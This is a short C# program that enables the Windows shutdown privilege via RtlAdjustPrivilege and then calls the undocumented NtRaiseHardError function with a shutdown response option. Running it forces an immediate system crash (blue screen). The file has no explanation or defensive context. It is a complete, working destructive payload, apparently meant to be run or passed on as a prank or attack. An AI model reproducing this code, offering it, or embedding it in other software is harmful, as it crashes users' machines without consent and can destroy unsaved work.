using System;
using System.Runtime.InteropServices;

namespace NtRaiseHardError {
    internal abstract class Program {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int privilege, bool bEnablePrivilege, bool isThreadPrivilege, out bool previousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);

        private const int Privilege = 19;

        private const uint ErrorStatus = 0xc0000022;

        private const uint ValidResponseOption = 6;

        private static void Main() {
            _ = RtlAdjustPrivilege(Privilege, true, false, out _);

            NtRaiseHardError(ErrorStatus, 0, 0, IntPtr.Zero, ValidResponseOption, out _);
        }
    }
}